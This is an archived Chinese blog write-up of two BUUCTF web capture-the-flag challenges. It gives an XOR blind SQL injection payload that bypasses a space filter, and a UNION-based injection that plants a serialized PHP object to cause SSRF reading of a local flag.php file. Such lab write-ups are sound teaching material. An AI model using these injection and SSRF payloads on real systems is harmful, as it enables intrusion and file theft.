<!--yml
category: 未分类
date: 2022-04-26 14:21:56
-->

# BUUCTF-Web题解（二）_flying_bird2019的博客-CSDN博客

> 来源：[https://blog.csdn.net/flying_bird2019/article/details/111461364](https://blog.csdn.net/flying_bird2019/article/details/111461364)

# Hack World

本题可以使用异或注入
0^(if(ascii(substr((select(flag)from(flag)),?,1))>?,1,0))
这道题主要学到了过滤空格如何注入
空格过滤可以用（字段）、反引号+字段+反引号
本题反引号也被过滤因此只能用括号

# Fatebook（SSRF）

首先注册一个账号，查看账号信息，可以看到有一个参数no
![在这里插入图片描述](img/af62ef594a128acf60b46ee7697d81b9.png)这里尝试sql注入
可以发现存在注入
得到数据库里的信息为

![在这里插入图片描述](img/0ea656e8c0c7e921ee484a9e720b722f.png)查看源码发现

![在这里插入图片描述](img/4d54003cf308a49a942128c6cf987569.png)
他会通过请求你提交的url资源的内容，因此可以SSRF，
sql注入写入数据
?no=0/**/union/**/select/**/1,2,3,‘O:8:“UserInfo”:3:{s:4:“name”;s:3:“123”;s:3:“age”;i:123;s:4:“blog”;s:29:“file:///var/www/html/flag.php”;}’#

![在这里插入图片描述](img/8e6890aaf50f5114a790cf59df3da81e.png)![在这里插入图片描述](img/16dae4df106feb8ded2f3d3e7bab9283.png)